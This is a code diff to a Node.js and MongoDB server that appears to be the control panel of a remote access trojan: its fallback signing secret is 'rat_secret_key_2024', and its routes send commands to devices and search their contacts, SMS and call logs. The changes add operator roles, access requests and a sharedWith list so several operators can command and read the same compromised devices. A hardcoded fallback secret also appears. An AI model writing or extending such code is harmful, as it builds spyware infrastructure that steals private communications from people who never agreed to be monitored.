@@ -75,6 +75,7 @@ const DeviceSchema = new mongoose.Schema({
   isHidden: { type: Boolean, default: false },
   hiddenAt: Date,
   commands: [mongoose.Schema.Types.Mixed],
+  sharedWith: [{ type: String, index: true }],
   data: {
     type: Map,
     of: mongoose.Schema.Types.Mixed,
@@ -89,6 +90,7 @@ const AdminSchema = new mongoose.Schema({
   username: { type: String, required: true, unique: true },
   password: { type: String, required: true },
   email: String,
+  role: { type: String, default: 'user', enum: ['superadmin', 'admin', 'user'] },
   apiKey: String,
   twoFactorSecret: String,
   isTwoFactorEnabled: { type: Boolean, default: false },
@@ -574,8 +576,12 @@ app.post('/api/auth/register', async (req, res) => {
       return res.status(400).json({ error: 'Username already exists' });
     }
     
+    // First user becomes superadmin, rest are 'user' role
+    const adminCount = await Admin.countDocuments();
+    const role = adminCount === 0 ? 'superadmin' : 'user';
+    
     const hashedPassword = await bcrypt.hash(password, 12);
-    const admin = new Admin({ username, password: hashedPassword, email, apiKey: uuidv4() });
+    const admin = new Admin({ username, password: hashedPassword, email, role, apiKey: uuidv4() });
     await admin.save();
     const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
     res.json({ token, admin: { username: admin.username, email: admin.email } });
@@ -586,6 +592,19 @@ app.post('/api/auth/register', async (req, res) => {
     res.status(500).json({ error: err.message });
   }
 });
+
+// Get all devices (owned + unassigned) for admins to claim
+// Device access request model
+const AccessRequestSchema = new mongoose.Schema({
+  deviceId: { type: String, required: true, index: true },
+  requesterId: { type: String, required: true, index: true },
+  ownerId: { type: String, required: true, index: true },
+  status: { type: String, default: 'pending', enum: ['pending', 'approved', 'rejected'] },
+  message: String,
+  reviewedAt: Date,
+  createdAt: { type: Date, default: Date.now }
+});
+const AccessRequest = mongoose.model('AccessRequest', AccessRequestSchema);
 
 // Get all devices (owned + unassigned) for admins to claim
 app.get('/api/devices/all', authMiddleware, async (req, res) => {
@@ -607,11 +626,92 @@ app.get('/api/devices/all', authMiddleware, async (req, res) => {
   }
 });
 
+// Request access to a device
+app.post('/api/devices/:deviceId/request-access', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { message } = req.body;
+    const device = await Device.findOne({ deviceId }).lean();
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    if (device.adminId == null || device.adminId === '' || device.adminId === undefined) {
+      return res.status(400).json({ error: 'Device is unassigned. Ask an admin to claim it first.' });
+    }
+    // Check if already requested
+    const existing = await AccessRequest.findOne({ deviceId, requesterId: req.adminId, status: 'pending' });
+    if (existing) return res.status(400).json({ error: 'Access request already pending' });
+    const request = new AccessRequest({
+      deviceId,
+      requesterId: req.adminId,
+      ownerId: device.adminId,
+      message: message || ''
+    });
+    await request.save();
+    res.json({ success: true, message: 'Access request sent to device owner' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Get pending access requests for admin's devices
+app.get('/api/access-requests', authMiddleware, async (req, res) => {
+  try {
+    const requests = await AccessRequest.find({ ownerId: req.adminId, status: 'pending' })
+      .sort({ createdAt: -1 })
+      .lean();
+    // Include requester details
+    const enriched = await Promise.all(requests.map(async (r) => {
+      const requester = await Admin.findById(r.requesterId).lean();
+      const device = await Device.findOne({ deviceId: r.deviceId }).lean();
+      return {
+        ...r,
+        requesterUsername: requester?.username || 'Unknown',
+        deviceModel: device?.deviceModel || device?.deviceId || 'Unknown'
+      };
+    }));
+    res.json(enriched);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Approve or reject access request
+app.post('/api/access-requests/:requestId', authMiddleware, async (req, res) => {
+  try {
+    const { requestId } = req.params;
+    const { action } = req.body; // 'approve' or 'reject'
+    const request = await AccessRequest.findOne({ _id: requestId, ownerId: req.adminId });
+    if (!request) return res.status(404).json({ error: 'Request not found' });
+    if (request.status !== 'pending') return res.status(400).json({ error: 'Request already processed' });
+    
+    request.status = action === 'approve' ? 'approved' : 'rejected';
+    request.reviewedAt = new Date();
+    await request.save();
+    
+    if (action === 'approve') {
+      // Grant access by adding requesterId to device's sharedWith array or similar
+      // For now, we'll create a shared access record
+      await Device.updateOne(
+        { deviceId: request.deviceId },
+        { $addToSet: { sharedWith: request.requesterId } }
+      );
+    }
+    
+    res.json({ success: true, status: request.status });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Devices Routes
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
-    // Show only devices belonging to this admin
-    const devices = await Device.find({ adminId: req.adminId }).sort({ lastSeen: -1 }).lean();
+        // Show devices owned by admin OR shared with admin
+    const devices = await Device.find({
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).sort({ lastSeen: -1 }).lean();
     // Normalize data Map
     devices.forEach(d => {
       if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
@@ -624,7 +724,13 @@ app.get('/api/devices', authMiddleware, async (req, res) => {
 
 app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
-    const device = await Device.findOne({ deviceId: req.params.deviceId, adminId: req.adminId }).lean();
+    const device = await Device.findOne({
+      deviceId: req.params.deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     if (device.data instanceof Map) {
       device.data = Object.fromEntries(device.data);
@@ -638,8 +744,14 @@ app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
 app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
   try {
     const { type, params } = req.body;
-    const device = await Device.findOne({ deviceId: req.params.deviceId, adminId: req.adminId });
-    if (!device) return res.status(404).json({ error: 'Device not found' });
+    const device = await Device.findOne({
+      deviceId: req.params.deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    });
+    if (!device) return res.status(404).json({ error: 'Device not found or no access' });
     
     const commandId = uuidv4();
     device.commands.push({
@@ -666,7 +778,13 @@ app.get('/api/devices/:deviceId/search/contacts', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+    const device = await Device.findOne({
+      deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let contacts = (device.data?.contacts || []);
     if (q) {
@@ -687,7 +805,13 @@ app.get('/api/devices/:deviceId/search/sms', authMiddleware, async (req, res) =>
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+    const device = await Device.findOne({
+      deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let sms = (device.data?.sms || []);
     if (q) {
@@ -708,7 +832,13 @@ app.get('/api/devices/:deviceId/search/callLogs', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+    const device = await Device.findOne({
+      deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let calls = (device.data?.callLogs || []);
     if (q) {
@@ -1146,7 +1276,13 @@ app.get('/api/stats', authMiddleware, async (req, res) => {
 app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
   try {
     const { deviceId, dataType } = req.params;
-    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+    const device = await Device.findOne({
+      deviceId,
+      $or: [
+        { adminId: req.adminId },
+        { sharedWith: req.adminId }
+      ]
+    }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     const data = device.data || {};
     if (data instanceof Map) {
